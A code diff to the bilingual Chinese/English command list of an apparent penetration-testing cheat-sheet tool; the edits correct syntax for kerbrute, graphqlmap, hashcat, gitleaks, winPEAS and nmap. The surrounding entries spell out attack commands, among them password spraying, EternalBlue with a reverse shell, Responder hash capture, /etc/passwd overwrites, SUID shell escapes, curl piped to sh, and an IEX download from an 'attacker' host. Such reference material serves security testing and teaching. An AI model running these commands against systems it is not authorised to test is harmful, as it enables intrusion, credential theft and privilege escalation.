@@ -1222,7 +1222,7 @@ export const toolCommands: ToolCommand[] = [
       { name: { zh: '用户枚举', en: 'User Enumeration' }, command: 'kerbrute userenum -d domain.com --dc dc_ip users.txt', description: { zh: '枚举域用户', en: 'Enumerate domain users' }, platform: 'all' },
       { name: { zh: '密码喷洒', en: 'Password Spraying' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123', description: { zh: '密码喷洒攻击', en: 'Password spraying attack' }, platform: 'all' },
       { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username', description: { zh: '暴力破解用户', en: 'Brute force user accounts' }, platform: 'all' },
-      { name: { zh: '域验证', en: 'Domain Validation' }, command: 'kerbrute -d domain.com --dc dc_ip user:password', description: { zh: '验证凭证', en: 'Verify credentials' }, platform: 'all' }
+      { name: { zh: '密码喷洒（单用户）', en: 'Password spray (single user)' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip -u username wordlist.txt', description: { zh: '对单个用户喷洒密码字典（kerbrute 无独立验证凭证子命令，用 passwordspray -u 实现）', en: 'Spray a password wordlist against one user (kerbrute has no standalone credential-check subcommand; use passwordspray -u)' }, platform: 'all' }
     ],
     references: ['https://github.com/ropnop/kerbrute']
   },
@@ -2109,19 +2109,19 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '自省查询', en: 'Introspection Query' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema',
+        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST\n# 进入交互 shell 后执行: dump_schema',
         description: { zh: '通过自省查询导出完整Schema', en: 'Export complete schema via introspection query' },
         platform: 'all'
       },
       {
         name: { zh: '字段枚举', en: 'Field Enumeration' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum',
+        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST\n# 进入交互 shell 后执行: enum',
         description: { zh: '枚举所有可用的Query/Mutation字段', en: 'Enumerate all available Query/Mutation fields' },
         platform: 'all'
       },
       {
         name: { zh: 'SQL注入', en: 'SQL Injection' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli',
+        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST\n# 进入交互 shell 后执行: nosqli',
         description: { zh: '测试GraphQL参数的注入漏洞', en: 'Test GraphQL parameters for injection vulnerabilities' },
         platform: 'all'
       }
@@ -4506,7 +4506,7 @@ export const toolCommands: ToolCommand[] = [
       { name: { zh: '访问共享', en: 'Access share' }, command: 'smbclient //target/share -U user%password\n# 交互命令: ls, get, put, cd\nsmbget -R smb://target/share/', description: { zh: '连接并访问 SMB 共享', en: 'Connect and access SMB share' }, platform: 'linux' },
       { name: { zh: 'EternalBlue (MS17-010)', en: 'EternalBlue exploit' }, command: 'msf: use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run', description: { zh: 'MS17-010 EternalBlue 漏洞利用', en: 'MS17-010 EternalBlue exploit' }, platform: 'linux' },
       { name: { zh: 'PsExec 横向移动', en: 'PsExec lateral movement' }, command: 'psexec.py domain/user:password@target\nimpacket-psexec user:pass@target cmd.exe', description: { zh: '通过 PsExec 横向移动', en: 'Lateral movement via PsExec' }, platform: 'linux' },
-      { name: { zh: 'Responder 捕获', en: 'Responder capture' }, command: 'sudo responder -I eth0 -rdw\n# 捕获到的 NTLMv2 哈希保存在 /usr/share/responder/logs/\nhascat -m 5600 hash.txt rockyou.txt', description: { zh: '使用 Responder 捕获 NTLM 哈希', en: 'Capture NTLM hashes using Responder' }, platform: 'linux' }
+      { name: { zh: 'Responder 捕获', en: 'Responder capture' }, command: 'sudo responder -I eth0 -rdw\n# 捕获到的 NTLMv2 哈希保存在 /usr/share/responder/logs/\nhashcat -m 5600 hash.txt rockyou.txt', description: { zh: '使用 Responder 捕获 NTLM 哈希', en: 'Capture NTLM hashes using Responder' }, platform: 'linux' }
     ],
     references: ['https://github.com/fortra/impacket']
   },
@@ -4663,7 +4663,7 @@ export const toolCommands: ToolCommand[] = [
       { name: { zh: 'GAU 历史 URL', en: 'GAU historical URLs' }, command: 'gau target.com | tee gau_urls.txt\ngau --subs target.com  # 包含子域名', description: { zh: '获取历史存档 URL', en: 'Fetch archived historical URLs' }, platform: 'all' },
       { name: { zh: 'Hakrawler 爬虫', en: 'Hakrawler spider' }, command: 'echo "https://target.com" | hakrawler -d 3 -subs\necho "https://target.com" | hakrawler -js  # 只看 JS 文件', description: { zh: '爬取目标 JS 和链接', en: 'Spider target for JS files and links' }, platform: 'linux' },
       { name: { zh: 'waybackurls', en: 'Wayback URLs' }, command: 'waybackurls target.com | tee wayback.txt\n# 过滤参数 URL\nwaybackurls target.com | grep "=" | anew params.txt', description: { zh: '从 Wayback Machine 获取历史 URL', en: 'Fetch historical URLs from Wayback Machine' }, platform: 'all' },
-      { name: { zh: 'Gitleaks 密钥扫描', en: 'Gitleaks secret scan' }, command: 'gitleaks detect --source . -v\ngitleaks detect --source . --report-format json -o leaks.json', description: { zh: '扫描代码仓库中的密钥泄露', en: 'Scan code repositories for secret leaks' }, platform: 'all' },
+      { name: { zh: 'Gitleaks 密钥扫描', en: 'Gitleaks secret scan' }, command: 'gitleaks git . -v\ngitleaks git . --report-format json -o leaks.json', description: { zh: '扫描代码仓库中的密钥泄露', en: 'Scan code repositories for secret leaks' }, platform: 'all' },
       { name: { zh: 'Trufflehog 密钥扫描', en: 'TruffleHog secret scan' }, command: 'trufflehog git https://github.com/target/repo\ntrufflehog filesystem /path/to/code --json', description: { zh: '深度扫描 Git 历史中的密钥', en: 'Deep scan Git history for secrets' }, platform: 'all' },
       { name: { zh: 'Subdomainizer JS 分析', en: 'Subdomainizer JS analysis' }, command: 'python3 SubDomainizer.py -u https://target.com -o subdomains.txt\npython3 SubDomainizer.py -l urls.txt -o subdomains.txt', description: { zh: '从 JS 文件提取子域名', en: 'Extract subdomains from JavaScript files' }, platform: 'all' }
     ],
@@ -5173,7 +5173,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       { name: { zh: 'JADX Android 反编译', en: 'JADX Android decompile' }, command: 'jadx -d output/ app.apk\njadx-gui app.apk  # GUI模式\n# 搜索字符串\ngrep -r "password\\|secret\\|key" output/ --include="*.java"', description: { zh: 'Android APK 反编译', en: 'Decompile Android APK' }, platform: 'all' },
       { name: { zh: 'APKTool 资源提取', en: 'APKTool resource extract' }, command: 'apktool d app.apk -o output/\napktool b output/ -o rebuilt.apk\n# 重新签名\njarsigner -keystore keystore.jks rebuilt.apk alias', description: { zh: 'APK 反编译和重打包', en: 'APK decompilation and repackaging' }, platform: 'all' },
-      { name: { zh: 'dnSpy .NET 反编译', en: 'dnSpy .NET decompile' }, command: '# dnSpy GUI: 拖入 .exe/.dll\n# 命令行 ILSpy\nilspycmd assembly.dll > decompiled.cs\ndotnet ilspycmd assembly.dll -o ./output/', description: { zh: '.NET 程序集反编译', en: 'Decompile .NET assembly' }, platform: 'all' },
+      { name: { zh: 'dnSpy .NET 反编译', en: 'dnSpy .NET decompile' }, command: '# dnSpy GUI: 拖入 .exe/.dll\n# 命令行 ILSpy\nilspycmd assembly.dll > decompiled.cs\nilspycmd -o ./output/ assembly.dll', description: { zh: '.NET 程序集反编译', en: 'Decompile .NET assembly' }, platform: 'all' },
       { name: { zh: 'objdump ELF 分析', en: 'objdump ELF analysis' }, command: 'objdump -d binary | head -100\nobjdump -T binary  # 动态符号\nobjdump -S binary  # 反汇编+源码\nreadelf -a binary | head -50', description: { zh: 'ELF 二进制文件分析', en: 'ELF binary file analysis' }, platform: 'linux' },
       { name: { zh: 'strings 分析', en: 'strings analysis' }, command: 'strings binary | grep -iE "flag|pass|key|token|secret"\nstrings -a -n 6 binary | head -100\nstrings binary | grep http', description: { zh: '从二进制提取字符串', en: 'Extract strings from binary' }, platform: 'all' }
     ],
@@ -5795,7 +5795,7 @@ export const toolCommands: ToolCommand[] = [
       { name: { zh: 'find SUID 提权', en: 'find SUID escalation' }, command: 'find . -exec /bin/sh -p \\;\n# 或\nfind / -name flag.txt -exec cat {} \\;', description: { zh: 'find 二进制 SUID 提权', en: 'Privilege escalation via find binary' }, platform: 'linux' },
       { name: { zh: 'vim/nano 提权', en: 'vim/nano escalation' }, command: '# vim SUID\nvim -c ":python3 import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"\nvim -c ":!bash -p"\n# sudo vim\nsudo vim -c ":!bash"', description: { zh: 'vim 编辑器提权', en: 'Privilege escalation via vim' }, platform: 'linux' },
       { name: { zh: 'python/perl/ruby 提权', en: 'Script interpreter escalation' }, command: '# python sudo 提权\nsudo python3 -c "import os; os.system(\'/bin/bash\')"\n# perl\nsudo perl -e "exec \'/bin/bash\'"\n# ruby\nsudo ruby -e "exec \'/bin/bash\'"', description: { zh: '脚本解释器提权', en: 'Script interpreter privilege escalation' }, platform: 'linux' },
-      { name: { zh: 'cp/mv 写入', en: 'cp/mv write escalation' }, command: '# 覆盖 /etc/passwd\ncP /tmp/fakepwd /etc/passwd\n# 写入 crontab\ncp /tmp/cron /etc/cron.d/evil', description: { zh: 'cp/mv SUID 文件写入提权', en: 'File write escalation via cp/mv SUID' }, platform: 'linux' },
+      { name: { zh: 'cp/mv 写入', en: 'cp/mv write escalation' }, command: '# 覆盖 /etc/passwd\ncp /tmp/fakepwd /etc/passwd\n# 写入 crontab\ncp /tmp/cron /etc/cron.d/evil', description: { zh: 'cp/mv SUID 文件写入提权', en: 'File write escalation via cp/mv SUID' }, platform: 'linux' },
       { name: { zh: 'less/more 提权', en: 'less/more escalation' }, command: '# 在 pager 中\n!bash\n!/bin/sh', description: { zh: 'less/more SUID Shell 逃逸', en: 'Shell escape via less/more SUID' }, platform: 'linux' }
     ],
     references: ['https://gtfobins.github.io/']
@@ -5846,7 +5846,7 @@ export const toolCommands: ToolCommand[] = [
     description: { zh: '提权检测和利用自动化工具命令', en: 'Privilege escalation detection and exploitation tool commands' },
     category: { zh: '权限提升', en: 'Privilege Escalation' },
     commands: [
-      { name: { zh: 'PEASS 工具集', en: 'PEASS toolkit' }, command: '# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# WinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe -o winpeas.exe', description: { zh: '下载执行 PEASS 提权脚本', en: 'Download and run PEASS escalation scripts' }, platform: 'all' },
+      { name: { zh: 'PEASS 工具集', en: 'PEASS toolkit' }, command: '# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# WinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe', description: { zh: '下载执行 PEASS 提权脚本', en: 'Download and run PEASS escalation scripts' }, platform: 'all' },
       { name: { zh: 'BeRoot', en: 'BeRoot check' }, command: 'python beRoot.py\n# 自动检查所有常见提权向量\n# 支持 Linux/Windows/macOS', description: { zh: 'BeRoot 自动提权检测', en: 'BeRoot automatic privilege escalation detection' }, platform: 'all' },
       { name: { zh: 'PowerUp Windows', en: 'PowerUp Windows escalation' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerUp.ps1")\nInvoke-AllChecks\n# 自动检查并利用\nInvoke-AllChecks | Out-File -Encoding ASCII checks.txt', description: { zh: 'PowerUp 自动 Windows 提权', en: 'PowerUp automatic Windows privilege escalation' }, platform: 'windows' },
       { name: { zh: 'Sudo 版本漏洞', en: 'Sudo version exploits' }, command: 'sudo --version\n# CVE-2021-3156 (sudo < 1.9.5p2)\n# CVE-2019-14287 (sudo < 1.8.28): sudo -u#-1 /bin/bash', description: { zh: 'Sudo 版本漏洞检测', en: 'Check for sudo version vulnerabilities' }, platform: 'linux' }
@@ -6266,7 +6266,7 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '信息收集', en: 'Information Gathering' },
     commands: [
       { name: { zh: '历史敏感信息', en: 'Sensitive info in history' }, command: "git log --all --full-history -- '**/*.env'\ngit grep 'password\\|secret\\|token' $(git rev-list --all)\ngit log -p | grep -iE 'password|secret|api_key|token' | head -50", description: { zh: '搜索 Git 历史中的敏感信息', en: 'Search Git history for sensitive information' }, platform: 'all' },
-      { name: { zh: 'Gitleaks 扫描', en: 'Gitleaks scan' }, command: 'gitleaks detect --source .\ngitleaks detect --source . --verbose --report-format json -o leaks.json', description: { zh: 'Gitleaks 自动化密钥扫描', en: 'Automated secret scanning with Gitleaks' }, platform: 'all' },
+      { name: { zh: 'Gitleaks 扫描', en: 'Gitleaks scan' }, command: 'gitleaks git .\ngitleaks git . --verbose --report-format json -o leaks.json', description: { zh: 'Gitleaks 自动化密钥扫描', en: 'Automated secret scanning with Gitleaks' }, platform: 'all' },
       { name: { zh: 'TruffleHog 扫描', en: 'TruffleHog scan' }, command: 'trufflehog git file://.\ntrufflehog github --repo https://github.com/target/repo', description: { zh: 'TruffleHog 深度密钥扫描', en: 'Deep secret scan with TruffleHog' }, platform: 'all' }
     ],
     references: ['https://github.com/gitleaks/gitleaks']
@@ -6424,8 +6424,8 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '信息收集', en: 'Information Gathering' },
     commands: [
       { name: { zh: 'Masscan + Nmap 组合', en: 'Masscan + Nmap combo' }, command: 'masscan -p1-65535 target/24 --rate=1000 -oG masscan.txt\ngrep "open" masscan.txt | awk "{print $4}" | cut -d/ -f1 | sort -un > ports.txt\nnmap -sV -sC -p$(cat ports.txt | tr "\\n" ",") target', description: { zh: '快速全端口扫描后精细探测', en: 'Fast full-port scan followed by detailed probing' }, platform: 'linux' },
-      { name: { zh: 'Nmap IPv6 扫描', en: 'Nmap IPv6 scan' }, command: 'nmap -6 target_ipv6\nnmap -6 -sV fe80::1 --source-interface eth0\nnmap --script ipv6-node-info target', description: { zh: 'IPv6 目标扫描', en: 'IPv6 target scanning' }, platform: 'linux' },
-      { name: { zh: '防火墙规则发现', en: 'Firewall rule discovery' }, command: 'nmap -sA target  # ACK 扫描\nnmap -sW target  # Window 扫描\nnmap --badsum target  # 校验错误包\nnmap -f --mtu 8 target  # 分片', description: { zh: '发现防火墙规则和过滤', en: 'Discover firewall rules and filtering' }, platform: 'linux' }
+      { name: { zh: 'Nmap IPv6 扫描', en: 'Nmap IPv6 scan' }, command: 'nmap -6 target_ipv6\nnmap -6 -sV fe80::1 -e eth0\nnmap --script ipv6-node-info target', description: { zh: 'IPv6 目标扫描', en: 'IPv6 target scanning' }, platform: 'linux' },
+      { name: { zh: '防火墙规则发现', en: 'Firewall rule discovery' }, command: 'nmap -sA target  # ACK 扫描\nnmap -sW target  # Window 扫描\nnmap --badsum target  # 校验错误包\nnmap -f target  # 或 nmap --mtu 8 target（-f 与 --mtu 互斥，二选一）  # 分片', description: { zh: '发现防火墙规则和过滤', en: 'Discover firewall rules and filtering' }, platform: 'linux' }
     ],
     references: ['https://nmap.org/book/']
   },
